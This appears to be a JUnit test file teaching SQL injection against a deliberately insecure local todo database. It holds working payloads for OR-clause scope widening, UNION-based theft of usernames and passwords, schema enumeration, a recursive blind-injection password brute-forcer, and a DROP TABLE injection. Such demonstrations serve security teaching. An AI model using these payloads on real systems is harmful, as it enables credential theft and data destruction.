package sqlinjection.insecuredb.numericfield;

import org.junit.jupiter.api.Assertions;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import sqlinjection.insecuredb.DbApi;
import sqlinjection.tododb.MyDB;


import java.sql.SQLException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

class SelectNumericSQLInjectionsTest {

    /* examples of what SQL Injection is capable of */

    DbApi myDB;

    // one of the injections is a drop tables so create db each time
    @BeforeEach
    void setupDB(){
        myDB = new DbApi(new MyDB().create());
    }

    /*
        Simple example of extending the scope of a query by expanding the where clause to include an or

        -1 or 1=1
        -1 or true

        It doesn't really matter what the first one is i.e. -1

        The aim is that the second clause should allow matching everything so all records can be returned.

     */

    @ParameterizedTest
    @ValueSource(strings = {"-1 or 1=1",
                            "-1 or true"})
    void extendScopeOfWhereByAddingAnOr(String doneStatus) {

        List<String> descriptions = myDB.getTodosOfStatus(doneStatus);

        Assertions.assertEquals(3, descriptions.size());
        Assertions.assertEquals("Do this activity", descriptions.get(0));
    }




    /*
        ## Reveal Information Not Associated With Direct Query

        When the result set from a query is revealed to the user we can
        use that to reveal information that was never intended to be seen.

        donestatus is an integer, so we don't need to escape or close any quotes
        this means we can simply inject the query.

        UNION allows us to pull in other information from other tables.

        We do need to know the structure of the database in order to do this

        In this example we are concatenating the name and password and revealing
        them as a 'description' field.

     */
    @Test
    void UnionToPullInformationFromAnotherTable() throws SQLException {

        // get the admin user instead
        String doneStatus = "-1 UNION SELECT name || '~' || password as description from users";

        List<String> descriptions = myDB.getTodosOfStatus(doneStatus);

        Assertions.assertEquals(2, descriptions.size());
        Assertions.assertEquals("admin~root", descriptions.get(0));
        Assertions.assertEquals("bob~dobbs", descriptions.get(1));

    }

    /*
        This test is a simpler example without the concatenation.
     */
    @Test
    void UnionToPullNameFromAnotherTable() throws SQLException {

        // get the admin user instead
        String doneStatus = "-1 UNION SELECT name as description from users";

        List<String> descriptions = myDB.getTodosOfStatus(doneStatus);

        Assertions.assertEquals(2, descriptions.size());
        Assertions.assertEquals("admin", descriptions.get(0));
        Assertions.assertEquals("bob", descriptions.get(1));

    }

    @ParameterizedTest(name = "INFO: {0}")
    @ValueSource(strings = {
                "-1 UNION SELECT table_name as description from information_schema.tables",
                "-1 UNION SELECT name || '=' || value as description from information_schema.settings"})
    void findInformationAboutTheDatabase(String injection) throws SQLException {

        List<String> descriptions = myDB.getTodosOfStatus(injection);

        for(String desc: descriptions){
            System.out.println(desc);
        }

        Assertions.assertTrue(descriptions.size()>0);

    }

    @Test
    void blindSqlToBruteForceGetPassword(){
        Map<String, String> usernamePasswords = bruteForceGuessPasswords("", 'A');

        for(Map.Entry<String,String>usernamePassword : usernamePasswords.entrySet()){
            System.out.println(String.format("Found: Username [%s] with Password [%s]", usernamePassword.getKey(), usernamePassword.getValue()));
        }

        Assertions.assertEquals(2, usernamePasswords.keySet().size(), "Wanted to find 2 users");
    }

    Map<String, String> bruteForceGuessPasswords(String passwordGuess, char nextChar){

        Map<String, String> usernamePasswords = new HashMap<>();

        char myNextChar = nextChar;

        while(myNextChar<='z') {

            String myPasswordGuess = passwordGuess + myNextChar;

            List<String> usernames = myDB.getTodosOfStatus("-1 UNION SELECT name FROM users WHERE LEFT(password, " + myPasswordGuess.length() + ")='" + myPasswordGuess + "'");
            if (usernames.size() > 0) {
                // found a user with matching password partial
                System.out.println(usernames + " - " + myPasswordGuess);
                Map<String, String> retMap = bruteForceGuessPasswords(myPasswordGuess, 'A');

                for(Map.Entry<String,String>usernamePassword : retMap.entrySet()){
                    if(usernames.contains(usernamePassword.getKey())){
                        // the one found during recursive is better
                        usernamePasswords.put(usernamePassword.getKey(), usernamePassword.getValue());
                        usernames.remove(usernamePassword.getKey());
                    }
                }
                // use any we found
                for(String username : usernames){
                    usernamePasswords.put(username, myPasswordGuess);
                }
            }
            myNextChar+=1;
        }

        return usernamePasswords;
    }

    // TODO: more select examples
    // TODO: more query formats e.g. ' and " in the middle of a string
    // TODO: DROP Tables and more manipulative injections


    @Test
    void dropTablesInASelect(){

        List<String> result = myDB.getTodosOfStatus("0; DROP TABLE todos;");

        Assertions.assertEquals(2, result.size());

        // oops we broke it in the last injection
        List<String> result2 = myDB.getTodosOfStatus("0");
        Assertions.assertEquals(0, result2.size());
    }

    // TODO: other query types UPDATE, INSERT, DELETE etc.
    // TODO: revealing errors in reported exceptions
    // TODO: combining multiple commands in one query SELECT *;UPDATE *;etc.

}
